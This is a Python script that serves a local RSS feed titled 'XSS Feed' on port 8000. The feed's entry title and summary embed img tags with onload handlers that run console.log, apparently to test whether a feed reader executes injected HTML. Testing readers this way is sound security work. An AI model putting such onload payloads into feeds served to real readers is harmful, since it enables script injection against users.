from http.server import HTTPServer, SimpleHTTPRequestHandler
from feedgen.feed import FeedGenerator
from pprint import pprint

# Create the feed generator object
fg = FeedGenerator()

# Set the feed metadata
fg.id('http://localhost:8000/bad_data.xml')
fg.title('XSS Feed')
fg.link(href='http://localhost:8000/bad_data.xml', rel='alternate')
fg.language('en')
fg.description("This feed inject a XSS, or at least try.")

# Add some entries to the feed
fe = fg.add_entry()
fe.id('http://localhost:8000/download_malware')
fe.title('<img src="http://unsplash.it/10/100?random" onload="console.log(`I come from the title of this article`);" />')
fe.summary('<img onload="console.log(`And I come from the description ...`)" src="http://unsplash.it/100/100?random"/>')
fe.link(href='http://localhost:8000/download_malware', rel='alternate')
fe.pubDate('2023-04-15T08:00:00Z')

# Generate the RSS feed XML
rssfeed = fg.rss_str(pretty=True)

class RSSHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/rss+xml')
        self.end_headers()
        self.wfile.write(rssfeed)

# Create the HTTP server object
server_address = ('', 8000)
httpd = HTTPServer(server_address, RSSHandler)

# Start the HTTP server
print('Starting server at http://localhost:8000/')
print("Here is the RSS feed:")
pprint(rssfeed)

print("Access to it at: http://localhost:8000/bad_data.xml")
httpd.serve_forever()